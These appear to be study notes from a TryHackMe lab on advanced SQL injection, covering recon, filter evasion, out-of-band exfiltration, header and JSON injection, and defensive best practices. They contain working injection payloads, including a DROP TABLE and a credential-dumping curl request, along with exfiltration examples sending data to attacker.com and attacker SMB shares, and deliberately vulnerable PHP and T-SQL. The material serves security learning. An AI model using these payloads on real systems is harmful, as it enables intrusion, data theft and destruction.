# Advanced SQL Injection

## TASK 1 Intro

    Use nmap to see open ports, running services, targt os, etc.

    ```
    thm@machine$ nmap -A -T4 -p 3306,3389,445,139,135 10.82.144.150

    Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-25 12:03 BST
    Nmap scan report for 10.82.144.150
    Host is up (0.00034s latency).

    PORT     STATE    SERVICE       VERSION
    135/tcp  open     msrpc
    139/tcp  open     netbios-ssn
    445/tcp  open     microsoft-ds
    3306/tcp open     mysql
    3389/tcp open     ms-wbt-server Microsoft Terminal Services
    | ssl-cert: Subject: commonName=SQLi
    | Not valid before: 2024-05-23T04:08:44
    |_Not valid after:  2024-11-22T04:08:44
    |_ssl-date: 2024-05-25T11:03:33+00:00; 0s from scanner time.
    MAC Address: 02:87:BD:21:12:33 (Unknown)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: specialized
    Running (JUST GUESSING): AVtech embedded (87%)
    Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 1 hop
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 17.67 seconds
    ```

## TASK 2 Quick Recap

In-band SQL Injection

    This is the most common type of SQL injection, where the attacker uses the same channel for injection and data retrieval:
    - **Error-Based SQL Injection**: Exploits error messages to gather database information.
    - **Union-Based SQL Injection**: Uses the UNION operator to retrieve data from other tables.

Inferential (Blind) SQL Injection

    This technique does not directly transfer data but infers information by observing application behavior. It includes:
    - **Boolean-Based Blind SQL Injection** : Infers true/false conditions by analyzing application responses.
    - **Time-Based Blind SQL Injection**    : Measures response delays to infer true/false conditions.

Out-of-band SQL Injection

    Used when the same channel cannot be used for attack and data retrieval. 
    It relies on the database server making external requests (e.g., HTTP or DNS) to send results to the attacker.

## TASK 3 Second-Order SQL Injection

Second-order SQL injection exploits stored user input that is later used in SQL queries. 
The attack triggers when the saved data is retrieved and processed, making it harder to detect during initial input validation.

The normal query for updating a book might look like this:
    UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';

if the attacker uses the ssn value:
    12345'; UPDATE books SET book_name = 'Hacked'; --

The code will execute the following statement when the admin or any other user visits the URL http://10.82.144.150/second/update.php
    UPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name ="hacked"; --'; INSERT INTO logs (page) VALUES ('update.php');

if the attacker uses the ssn value, table hello will be dropped:
    67890'; DROP TABLE hello;--

## TASK 4 Filter Evasion Techniques

Advanced SQL injection attacks require bypassing filters to exploit vulnerabilities. 
Modern defenses sanitize or block common patterns, making basic attempts ineffective. 
Techniques like character encoding, no-quote injection, and handling space restrictions help evade filters and penetrate secure applications.

Character Encoding

    Character encoding converts SQL payloads into encoded forms to bypass filters:
  
        URL Encoding: Converts characters to % followed by their ASCII hex value (e.g., ' OR 1=1-- becomes %27%20OR%201%3D1--).
        Hexadecimal Encoding: Represents strings as hex values (e.g., 'admin' becomes 0x61646d696e).
        Unicode Encoding: Uses Unicode escape sequences (e.g., 'admin' becomes \u0061\u0064\u006d\u0069\u006e).

    By entering below, we receive SQL syntax error, which means we are able to try SQL injection.
        Intro to PHP' OR 1=1

    Let's use the payload directly on the PHP page to avoid unnecessary tweaking/validation from the client. 
    Below contain the standard payload, where the error is same as before.
        Intro to PHP' OR 1=1
        http://10.80.140.92/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1

    Now, URL encode the payload Intro to PHP' || 1=1 --+ using Cyber Chef 
        http://10.80.140.92/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20%7C%7C%201=1%20--%20

    When URL encoding a payload, spaces are encoded as '%20' or '+'. 
    In SQL injection scenarios, including the '+' can help bypass filters that may strip out spaces, allowing the injection to function correctly.
    Still, it all depends on the backend.

## TASK Filter Evasion Techniques (continued)

No-Quote SQL Injection

    No-Quote SQL injection techniques are used when the application filters single or double quotes or escapes.

        Using Numerical Values  :   One approach is to use numerical values or other data types that do not require quotes. 
                                    For example, instead of injecting ' OR '1'='1, an attacker can use OR 1=1 in a context where quotes are not necessary. 
                                    This technique can bypass filters that specifically look for an escape or strip out quotes, allowing the injection to proceed.

        Using SQL Comments      :   Another method involves using SQL comments to terminate the rest of the query. 
                                    For instance, the input admin'-- can be transformed into admin--, where the -- signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. 
                                    This can help bypass filters and prevent syntax errors.

        Using CONCAT() Function :   Attackers can use SQL functions like CONCAT() to construct strings without quotes. 
                                    For example, CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e) constructs the string admin. 
                                    The CONCAT() function and similar methods allow attackers to build strings without directly using quotes, making it harder for filters to detect and block the payload.

No Spaces Allowed

    When spaces are not allowed or are filtered out, various techniques can be used to bypass this restriction.

        Comments to Replace Spaces  :   One common method is to use SQL comments (/**/) to replace spaces. 
                                        For example, instead of SELECT * FROM users WHERE name = 'admin', an attacker can use SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'. 
                                        SQL comments can replace spaces in the query, allowing the payload to bypass filters that remove or block spaces.

        Tab or Newline Characters   :   Another approach is using tab (\t) or newline (\n) characters as substitutes for spaces. 
                                        Some filters might allow these characters, enabling the attacker to construct a query like SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'. 
                                        This technique can bypass filters that specifically look for spaces.

        Alternate Characters        :   One effective method is using alternative URL-encoded characters representing different types of whitespace, such as %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space). 
                                        These characters can replace spaces in the payload. 

Practical Example

    http://10.80.185.57/space/search_users.php?username=? filters common SQL injection keywords like OR, AND, and spaces (%20) to prevent attacks.

    Noob developer's filter: 

        $special_chars = array(" ", "AND", "and" ,"or", "OR" , "UNION", "SELECT");
        $username = str_replace($special_chars, '', $username);
        $sql = "SELECT * FROM user WHERE username = '$username'";

    If we use our standard payload `1%27%20||%201=1%20--+` on the endpoint, it fails due to spaces being omitted by the code. 
    To bypass this, we can use URL-encoded characters like `%09` (tab) or `%0A` (newline) to replace spaces. 
    For example, the payload `1' OR 1=1 --` can be modified to `1'%0A||%0A1=1%0A--%27+`. 
    The SQL parser interprets newline characters as spaces, effectively transforming the query into `SELECT * FROM users WHERE username = '1' OR 1=1 --`, bypassing the space filter.

    Various techniques to bypass filters and WAFs:
        Scenario                                    Description                             Example
        ----------------------------------------- --------------------------------------- ----------------------------------------------
        Keywords like SELECT are banned             SQL keywords can often be bypassed      SElEcT * FrOm users or 
                                                    by changing their case or adding        SE/**/LECT * FROM/**/users
                                                    inline comments to break them up.       
        ----------------------------------------- --------------------------------------- ----------------------------------------------
        Spaces are banned                           Using alternative whitespace            SELECT%0A*%0AFROM%0Ausers or 
                                                    characters or comments to replace       SELECT/**/*/**/FROM/**/users
                                                    spaces can help bypass filters.         
        ----------------------------------------- --------------------------------------- ----------------------------------------------
        Logical operators like AND, OR are banned   Using alternative logical operators     username = 'admin' && password = 
                                                    or concatenation to bypass keyword      'password' or username = 'admin'/**/||/**/1=1 --
                                                    filters.                                
        ----------------------------------------- --------------------------------------- ----------------------------------------------
        Common keywords like UNION, SELECT          Using equivalent representations        SElEcT * FROM users WHERE username = 
        are banned                                  such as hexadecimal or Unicode          CHAR(0x61,0x64,0x6D,0x69,0x6E)
                                                    encoding to bypass filters.             
        ----------------------------------------- --------------------------------------- ----------------------------------------------
        Specific keywords like OR, AND, SELECT,     Using obfuscation techniques to         SElECT * FROM users WHERE username = 
        UNION are banned                            disguise SQL keywords by combining      CONCAT('a','d','m','i','n') or 
                                                    characters with string functions        SElEcT/**/username/**/FROM/**/users
                                                    or comments.                            

## TASK Out-of-band SQL Injection

Out-of-band (OOB) SQL injection exploits separate channels, like HTTP, DNS, or SMB, for sending payloads and receiving responses. 
It bypasses direct methods, minimizes detection risks, and circumvents firewalls or IDS.
Inject SQL payloads to trigger the database to communicate with an attacker-controlled server, enabling data exfiltration without direct interaction.

Techniques in Different Databases

    MySQL and MariaDB
        In MySQL/MariaDB, Out-of-band SQL injection uses `SELECT ... INTO OUTFILE` or `load_file` to write query results to the server's filesystem.
            ```
            SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
            ```
        An attacker can access the file via an SMB share or HTTP server on the database server, enabling data exfiltration through an alternate channel.

    Microsoft SQL Server (MSSQL)
        In MSSQL, Out-of-band SQL injection can use features like `xp_cmdshell` to execute shell commands and write data to a network share:
            ```
            EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
            ```
        Alternatively, `OPENROWSET` or `BULK INSERT` can interact with external data sources for data exfiltration.

    Oracle
        In Oracle databases, Out-of-band SQL injection can use the UTL_HTTP package to send HTTP requests with sensitive data:
            ```
            DECLARE
                req UTL_HTTP.REQ;
                resp UTL_HTTP.RESP;
            BEGIN
                req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
                UTL_HTTP.GET_RESPONSE(req);
            END;
            ```

Examples of Out-of-band Techniques
    Out-of-band SQL injection in MySQL/MariaDB can exfiltrate data via DNS, HTTP, or SMB, depending on the database's capabilities and network setup.

    HTTP Requests
        Attackers can use database functions to send sensitive data via HTTP to a controlled server. 
        While MySQL/MariaDB lack native HTTP support, this can be achieved using external scripts or User-Defined Functions (UDFs). 
        For example: SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;. 
        This method depends on database configuration and system compatibility.

    DNS Exfiltration 
        Attackers can exploit SQL queries to generate DNS requests containing encoded data, sent to an attacker-controlled DNS server. 
        This bypasses HTTP monitoring and leverages the database's DNS lookup capabilities. 
        MySQL may require UDFs or scripts for such attacks.

    SMB Exfiltration
        SMB exfiltration writes query results to an SMB share on an external server, effective in Windows and configurable in Linux. 
        Example query: SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';. 
        Windows supports SMB natively, while Linux can use smbclient or mount shares for access.

Practical Example
    1. Set up a network share on the AttackBox at ATTACKBOX_IP\logs to exfiltrate data. 
    2. Start the SMB server by navigating to `/opt/impacket/examples` and running:
            python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp
    3. The server-side code for this feature seems vulnerable to SQL injection
            http://10.82.149.226/oob/search_visitor.php?visitor_name=Tim
    4. Attacker crafts a payload that writes the database version information to an external SMB share.
            1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
    5. The output will be written at /tmp/out.txt
    6. Optional: access the share with:
            smbclient //ATTACKBOX_IP/logs -U guest -N

    The vulnerable server code looks like this:
        ```
        $visitor_name = $_GET['visitor_name'] ?? '';
        
        $sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
        
        echo "<p>Generated SQL Query: $sql</p>";
        
        // Execute multi-query
        if ($conn->multi_query($sql)) {
            do {
                // Store first result set
                if ($result = $conn->store_result()) {
                    if ($result->num_rows > 0) {
                        while ($row = $result->fetch_assoc()) {
        ```
            
    Important Consideration
        MySQL's `secure_file_priv` variable may restrict file operations to a specific directory, mitigating unauthorized file writes. 
            - If set, file operations like `INTO OUTFILE` are limited to the specified directory, reducing exfiltration risks.
            - If empty, no restrictions apply, allowing files to be written anywhere accessible by the MySQL server, increasing risk.

## TASK Other Techniques

HTTP Header Injection
    HTTP headers can carry user input, which might be used in SQL queries. 
    If unsanitized, this can lead to SQL injection. 
    For example, a malicious User-Agent header like `User-Agent: ' OR 1=1; --` could exploit vulnerabilities.

    The weak server-side code that inserts the logs.
        ```
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
        if ($conn->query($insert_sql) === TRUE) {
            echo "<p class='text-green-500'>New logs inserted successfully</p>";
        } else {
            echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>";
        }

        $sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
        ..
        ...
        ```

    The server's response will be displayed in the terminal. 
    If the SQL injection is successful, you will see the extracted data (usernames and passwords) in the response.
        ```
        user@tryhackme$ curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://10.82.149.226/httpagent/
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>SQL Injection </title>
         rel="stylesheet">
        </head>
        <body class="bg-gray-100">
            <div class="container mx-auto p-8">
                <h1 class="text-4xl font-bold mb-8 text-center">HTTP Logs</h1>
                <div class="bg-white p-6 rounded-lg shadow-lg">

        <p class='text-gray-600 text-sm mb-4'>Generated SQL Query: <span class='text-red-500'>SELECT * FROM logs WHERE user_Agent = '' UNION SELECT username, password FROM user; #'</span></p>
        <div class='p-4 bg-gray-100 rounded shadow mb-4'>
            <p class='font-bold'>ID:</p>
            <ul class='list-disc pl-6'>
                <li><span class='text-gray-700'>bob</span> - <span class='text-gray-700'>bob@123</span></li>
                <li><span class='text-gray-700'>attacker</span> - <span class='text-gray-700'>tesla</span></li>
            </ul>
        </div>
            </div>
        </body>
        </html>
        ```

Exploiting Stored Procedures
    Stored procedures are precompiled SQL routines stored in the database. 
    While they improve performance and consistency, they can be vulnerable to SQL injection if parameters are not sanitized.

    The vulnerable procedure below concatenates user input into a dynamic SQL query, making it susceptible to SQL injection.
        ```
        CREATE PROCEDURE sp_getUserData
            @username NVARCHAR(50)
        AS
        BEGIN
            DECLARE @sql NVARCHAR(4000)
            SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
            EXEC(@sql)
        END
        ```

XML and JSON Injection 
    Applications parsing XML/JSON data and using it in SQL queries can be vulnerable to injection if inputs are not sanitized. 

    Malicious data can be injected into XML/JSON structures, leading to SQL injection.
        ```
        Example JSON payload:
        {
          "username": "admin' OR '1'='1--",
          "password": "password"
        }

        ```

    Vulnerable if used directly in a query below:
        SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password';

## TASK 8 Automation

Several tools aid in automating SQL Injection detection and exploitation:
    SQLMap          : Open-source tool for detecting and exploiting SQL Injection vulnerabilities across various databases.
    SQLNinja        : Focused on exploiting SQL Injection in web apps using Microsoft SQL Server.
    JSQL Injection  : Java library for detecting SQL Injection vulnerabilities in Java applications.
    BBQSQL          : Framework for automating Blind SQL Injection exploitation.

## TASK 9 Best Practices

Secure Coders
    Parameterised Queries: 
        Use parameterised queries to separate SQL structure from data, preventing injection. 
        Example in PHP: $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $username]);.
    
    Input Validation: 
        Validate and sanitise inputs to ensure they meet expected formats. 
        Use functions like htmlspecialchars() and filter_var() in PHP.

    Least Privilege: 
        Grant minimal database permissions to application accounts, avoiding administrative privileges.

    Stored Procedures: 
        Use stored procedures to encapsulate and validate SQL logic, ensuring inputs are sanitised within the database.

    Security Audits: 
        Perform regular audits and code reviews to identify and fix vulnerabilities, staying updated with threats.

Pentesters
    Exploiting Database-Specific Features: 
        Different database management systems (DBMS) have unique features and syntax. 
        A pentester should understand the specifics of the target DBMS (e.g., MySQL, PostgreSQL, Oracle, MSSQL) to exploit these features effectively. 
        For instance, MSSQL supports the xp_cmdshell command, which can be used to execute system commands.

    Leveraging Error Messages: 
        Exploit verbose error messages to gain insights into the database schema and structure. 
        Error-based SQL injection involves provoking the application to generate error messages that reveal useful information. 
        For example, using 1' AND 1=CONVERT(int, (SELECT @@version)) -- can generate errors that leak version information.
    
    Bypassing WAF and Filters: 
        Test various obfuscation techniques to bypass Web Application Firewalls (WAF) and input filters. 
        This includes using mixed case (SeLeCt), concatenation (CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))), and alternate encodings (hex, URL encoding). 
        Additionally, using inline comments (/**/) and different character encodings (e.g., %09, %0A) can help bypass simple filters.
    
    Database Fingerprinting: 
        Determine the type and version of the database to tailor the attack. 
        This can be done by sending specific queries that yield different results depending on the DBMS. 
        For instance, SELECT version() works on PostgreSQL, while SELECT @@version works on MySQL and MSSQL.

    Pivoting with SQL Injection: 
        Use SQL injection to pivot and exploit other parts of the network. 
        Once a database server is compromised, it can be used to gain access to other internal systems. 
        This might involve extracting credentials or exploiting trust relationships between systems.
    
## Appendix: